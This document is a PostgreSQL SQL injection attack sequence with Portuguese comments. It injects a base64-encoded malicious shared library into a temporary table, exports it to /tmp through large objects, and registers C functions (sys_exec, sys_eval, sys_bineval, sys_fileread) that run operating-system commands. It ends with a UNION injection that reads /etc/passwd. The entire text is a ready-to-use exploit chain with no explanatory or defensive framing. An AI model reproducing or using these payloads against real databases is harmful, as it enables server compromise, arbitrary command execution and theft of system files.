/* Upload da biblioteca dinamica */
/* P1: criacao de tabela temporaria */
'; create table tmp (data text)--

/* P2: inserção da biblioteca em tmp, codificada em BASE64 */
'; insert into tmp values(
'f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAA8AcAADQAAADoDgAAAAAAADQAIAAFACgAGQAYAAEAAAAA
AAAAAAAAAAAAAADsDAAA7AwAAAUAAAAAEAAAAQAAAOwMAADsHAAA7BwAAAABAAAIAQAABgAAAAAQ
AAACAAAABA0AAAQdAAAEHQAAyAAAAMgAAAAGAAAABAAAAAQAAADUAAAA1AAAANQAAAAkAAAAJAAA
AAQAAAAEAAAAUeV0ZAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAQAAAAEAAAAFAAAAAMAAABHTlUA
mBdSaMgPSwvr48uR/6WcsN5lbr8DAAAAFwAAAAQAAAAHAAAAAAAAAJTJD5mIDACNwEQAABcAAAAe
AAAAIwAAAC5nVB6oaL4Sql++ErrjknxCRdXsMl5UHl9N4yFKrSKdMqH0W9hxWBwkaBsyuY3xDjKS
aP7q0+8Oxg2m1Gc30+0AAAAAAAAAAAAAAAAAAAAAvwAAAAAAAAAAAAAAEgAAAAQBAAAAAAAAAAAA
ABIAAAD8AAAAAAAAAAAAAAASAAAApwAAAAAAAAAAAAAAEAAAAAEAAAAAAAAAAAAAACAAAAArAAAA
AAAAAAAAAAAgAAAAxQAAAAAAAAAAAAAAEgAAAKAAAAAAAAAAAAAAABIAAADNAAAAAAAAAAAAAAAS
AAAA1QAAAAAAAAAAAAAAEgAAAKgAAAAAAAAAAAAAABIAAAAtAQAAAAAAAAAAAAASAAAAOQEAAAAA
AAAAAAAAEgAAACcBAAAAAAAAAAAAABIAAAAJAQAAAAAAAAAAAAASAAAAMwEAAAAAAAAAAAAAEgAA
AGIAAAAAAAAAAAAAABIAAAD3AAAAAAAAAAAAAAASAAAAQAEAAAAAAAAAAAAAEgAAABwAAAAAAAAA
AAAAACIAAADbAAAAAAAAAAAAAAASAAAAjwAAAAAAAAAAAAAAEAAAAH0AAABUCQAACgAAABIACwCG
AAAAXgkAAFUAAAASAAsAtgAAAL0JAADHAAAAEgALAGMBAAD0HQAAAAAAABAA8f9QAQAA7B0AAAAA
AAAQAPH/rQAAALMJAAAKAAAAEgALABoBAAAvCwAAHwEAABIACwDiAAAAhAoAAAoAAAASAAsATQAA
AMoIAAA3AAAAEgALAFcBAADsHQAAAAAAABAA8f/rAAAAjgoAAJcAAAASAAsAEAAAAIwHAAAAAAAA
EgAJAGkAAAABCQAAUwAAABIACwAWAAAAiAwAAAAAAAASAAwAPwAAAMAIAAAKAAAAEgALABEBAAAl
CwAACgAAABIACwAAX19nbW9uX3N0YXJ0X18AX2luaXQAX2ZpbmkAX19jeGFfZmluYWxpemUAX0p2
X1JlZ2lzdGVyQ2xhc3NlcwBQZ19tYWdpY19mdW5jAHRleHRfcHRyX3RvX2NoYXJfcHRyAG1hbGxv
YwBjaHJfcHRyX3RvX3RleHRfcHRyAHBnX2ZpbmZvX3N5c19leGVjAHBnX2RldG9hc3RfZGF0dW0A
c3lzdGVtAHBmcmVlAHBnX2ZpbmZvX3N5c19ldmFsAHBvcGVuAHJlYWxsb2MAc3RybmNweQBmZ2V0
cwBwY2xvc2UAcGdfZmluZm9fc3lzX2JpbmV2YWwAZm9yawBzeXNjb25mAG1tYXAAd2FpdHBpZABw
Z19maW5mb19zeXNfZmlsZXJlYWQAZm9wZW4AZnNlZWsAZnRlbGwAZmNsb3NlAGZyZWFkAGxpYmMu
c28uNgBfZWRhdGEAX19ic3Nfc3RhcnQAX2VuZABHTElCQ18yLjEuMwBHTElCQ18yLjAAR0xJQkNf
Mi4xAAAAAgADAAMAAAAAAAAAAwADAAMAAwADAAMAAgACAAMAAwADAAMAAwAEAAIAAAABAAEAAQAB
AAEAAQABAAEAAQABAAEAAQABAAEAAQABAAAAAQADAEYBAAAQAAAAAAAAAHMfaQkAAAQAaAEAABAA
AAAQaWkNAAADAHQBAAAQAAAAEWlpDQAAAgB+AQAAAAAAAMIIAAAIAAAAVgkAAAgAAAC1CQAACAAA
AP4JAAAIAAAAhgoAAAgAAAAnCwAACAAAADULAAAIAAAAXQsAAAgAAAAAHQAACAAAAOkIAAACEQAA
IQkAAAIRAADjCQAAAhEAAPIJAAACEQAApQsAAAIRAADjCwAAAhEAAG4JAAACFgAAzQkAAAIWAACj
CgAAAhYAAEcLAAACFgAAeAkAAAIfAADVCQAAAh8AAFYLAAACHwAAggkAAAIIAACNCQAAAgsAACsM
AAACCwAAMwwAAAILAAA8DAAAAgsAAKEJAAACBAAABgoAAAIBAAAqCgAAAgcAAEEKAAACCQAAAAsA
AAIJAABSCgAAAgoAAGQKAAACFQAAgAoAAAIjAAAgDAAAAiMAAKwKAAACEgAAyQoAAAIDAADmCgAA
AgIAABQLAAACDwAAZgsAAAIOAACDCwAAAgwAAJoLAAACDAAAiwsAAAIQAAC3CwAAAg0AANcLAAAC
DQAAzwsAAAITAADMHQAABgUAANAdAAAGBgAA1B0AAAYUAADkHQAABwUAAOgdAAAHFAAAVYnlU4Ps
BOgAAAAAW4HDQBYAAIuT9P///4XSdAXoHgAAAOjNAAAA6JgEAABYW8nD/7MEAAAA/6MIAAAAAAAA
AP+jDAAAAGgAAAAA6eD/////oxAAAABoCAAAAOnQ////AAAAAFWJ5VZT6L8AAACBw94VAACNZCTw
gLsUAAAAAHVci4P8////hcB0Do2DKP///4kEJOi3////jbMg////jZMc////KdaLgxgAAADB/gKD
7gE58HMfkI10JgCNQAGJgxgAAAD/lIMc////i4MYAAAAOfBy5saDFAAAAAGNZCQQW15dw+sNkJCQ
kJCQkJCQkJCQkFWJ5VPoMAAAAIHDTxUAAI1kJOyLkyT///+F0nQVi4P4////hcB0C42TJP///4kU
JP/QjWQkFFtdw4scJMOQkJBVuMwMAACJ5V3DVYnlV1ZTg+woi3UIix6DxgTB6wKNQ/2NS/xQiU3k
6Pz///+LTeSJx/OkxkQY/ACNZfRbXl9dw1UxwInlV1ZTg8v/g+wYi3UIidmJ9/Kuiff30YPBA1Ho
/P///4nZicIxwPKuiff30Y0EjQwAAACJ2YkCMcDyro1CBInHidD30UnzpI1l9FteX13DVbjIDAAA
ieVdw1WJ5VdWU4PsKIt1CP92EOj8////icOJBCTo/P///4nHiQQk6Pz///+JPCSJReTo/P///4PE
EItF5DteEHQPg+wMU+j8////i0Xkg8QQjWX0W15fXcNVuMQMAACJ5V3DVYnlV1ZTg+woi0UI/3AQ
6Pz///+JBCTo/P///8cEJAAEAACJxuj8////xwQkAQAAAIlF5Oj8////xgAAicNZX2ikDAAAVjH2
6Pz///+DxBCJReDrNot95DHAg8n/8q5SUvfRSY08MVdTiU3c6Pz///+LTdyDxAxR/3XkjTQwicNW
if7o/P///4PEEFD/deBqBP915Oj8////g8QQhcB1tYPsDP914Oj8////g8QQgDsAdAXGRDP/AIld
CI1l9FteX13p/P///1W4wAwAAInlXcNVieVXVlO7AQAAAIPsKItFCP9wEOj8////iceLMOj8////
g8QQg/gAfGN1UYPsDMHuAoPuBGoeiXXk6Pz///+LVeReWWoAagBIaiGNFBD30GoHIdBQagDo/P//
/4PEIIP4/4nGdCdRg8cE/3XkMNtXUOj8/////9aDxBDrEFIx22oBagBQ6Pz///+DxBCNZfSJ2Fte
X13DVbi8DAAAieVdw1WJ5VdWvqkMAABTg+xIi0UIjX3X/3AQ6Pz///+5EQAAAPOkiQQk6Pz///9a
WWimDAAAUIlFxOj8////g8QQhcCJxnUJi0UIxkAMAetJV2oCagBQ6Pz///+JNCTo/P///4PEDGoA
agBWicPo/P///41DAYkEJOj8////g8QQhcCJx3UXg+wMVuj8////i0UIg8QQxkAMATHA631WagFT
UOj8////iTQk6Pz///+NRBsBiQQk6Pz///+DxBCJxjHA6yCKFAfA+gSD4g+KVBXXiBRGD74UB4Pi
D4pUFdeIVEYBQDnYjRQAfNmD7AzGBBYAVuj8////iTQkiUXA6Pz///+JPCTo/P///1v/dcTo/P//
/4tFwIPEEI1l9FteX13DkJBVieVWU+hf/P//gcN+EQAAi4MU////g/j/dBmNsxT///+NtCYAAAAA
jXb8/9CLBoP4/3X0W15dw1WJ5VOD7AToAAAAAFuBw0QRAADoUPv//1lbycNyAHJiADAxMjM0NTY3
ODlBQkNERUYAAAABAAAAAQAAAAEAAAABAAAAHAAAACQDAABkAAAAIAAAAEAAAAABAAAAAAAAAAAA
AAD/////AAAAAP////8AAAAAAAAAAAAdAAABAAAARgEAAAwAAACMBwAADQAAAIgMAAD1/v9v+AAA
AAUAAADUAwAABgAAAGQBAAAKAAAAiAEAAAsAAAAQAAAAAwAAANgdAAACAAAAEAAAABQAAAARAAAA
FwAAAHwHAAARAAAA7AUAABIAAACQAQAAEwAAAAgAAAAWAAAAAAAAAP7//2+sBQAA////bwEAAADw
//9vXAUAAPr//28JAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAQdAAAAAAAAAAAAANIHAADiBwAAR0NDOiAoR05VKSA0LjUuMSAyMDEwMDkyNCAo
UmVkIEhhdCA0LjUuMS00KQAALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gA
LmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsLmR5bgAucmVs
LnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5q
Y3IALmRhdGEucmVsLnJvAC5keW5hbWljAC5nb3QALmdvdC5wbHQALmJzcwAuY29tbWVudAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAHAAAAAgAAANQAAADUAAAA
JAAAAAAAAAAAAAAABAAAAAAAAAAeAAAA9v//bwIAAAD4AAAA+AAAAGwAAAADAAAAAAAAAAQAAAAE
AAAAKAAAAAsAAAACAAAAZAEAAGQBAABwAgAABAAAAAEAAAAEAAAAEAAAADAAAAADAAAAAgAAANQD
AADUAwAAiAEAAAAAAAAAAAAAAQAAAAAAAAA4AAAA////bwIAAABcBQAAXAUAAE4AAAADAAAAAAAA
AAIAAAACAAAARQAAAP7//28CAAAArAUAAKwFAABAAAAABAAAAAEAAAAEAAAAAAAAAFQAAAAJAAAA
AgAAAOwFAADsBQAAkAEAAAMAAAAAAAAABAAAAAgAAABdAAAACQAAAAIAAAB8BwAAfAcAABAAAAAD
AAAACgAAAAQAAAAIAAAAZgAAAAEAAAAGAAAAjAcAAIwHAAAwAAAAAAAAAAAAAAAEAAAAAAAAAGEA
AAABAAAABgAAALwHAAC8BwAAMAAAAAAAAAAAAAAABAAAAAQAAABsAAAAAQAAAAYAAADwBwAA8AcA
AJgEAAAAAAAAAAAAABAAAAAAAAAAcgAAAAEAAAAGAAAAiAwAAIgMAAAcAAAAAAAAAAAAAAAEAAAA
AAAAAHgAAAABAAAAAgAAAKQMAACkDAAARAAAAAAAAAAAAAAABAAAAAAAAACAAAAAAQAAAAIAAADo
DAAA6AwAAAQAAAAAAAAAAAAAAAQAAAAAAAAAigAAAAEAAAADAAAA7BwAAOwMAAAIAAAAAAAAAAAA
AAAEAAAAAAAAAJEAAAABAAAAAwAAAPQcAAD0DAAACAAAAAAAAAAAAAAABAAAAAAAAACYAAAAAQAA
AAMAAAD8HAAA/AwAAAQAAAAAAAAAAAAAAAQAAAAAAAAAnQAAAAEAAAADAAAAAB0AAAANAAAEAAAA
AAAAAAAAAAAEAAAAAAAAAKoAAAAGAAAAAwAAAAQdAAAEDQAAyAAAAAQAAAAAAAAABAAAAAgAAACz
AAAAAQAAAAMAAADMHQAAzA0AAAwAAAAAAAAAAAAAAAQAAAAEAAAAuAAAAAEAAAADAAAA2B0AANgN
AAAUAAAAAAAAAAAAAAAEAAAABAAAAMEAAAAIAAAAAwAAAOwdAADsDQAACAAAAAAAAAAAAAAABAAA
AAAAAADGAAAAAQAAADAAAAAAAAAA7A0AACwAAAAAAAAAAAAAAAEAAAABAAAAAQAAAAMAAAAAAAAA
AAAAABgOAADPAAAAAAAAAAAAAAABAAAAAAAAAA==')--

/* P3: criacao de objeto do tipo "large" */
'; select lo_create(1001)--

/* P4: atualizacao da parte de dados do objeto */
'; update pg_largeobject set data = (select decode(data,'base64') from tmp) where loid=1001--

/* P5: criacao da biblioteca no servidor */
'; select lo_export(1001,'/tmp/lib_postgresqludf_sys.so')--


/* P6: criacao das UDFs */
';
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_bineval(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_bineval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_fileread(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_fileread' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;--

/* Execucao de comando */
' and 1=2 union select 1,null,sys_eval('cat /etc/passwd')--

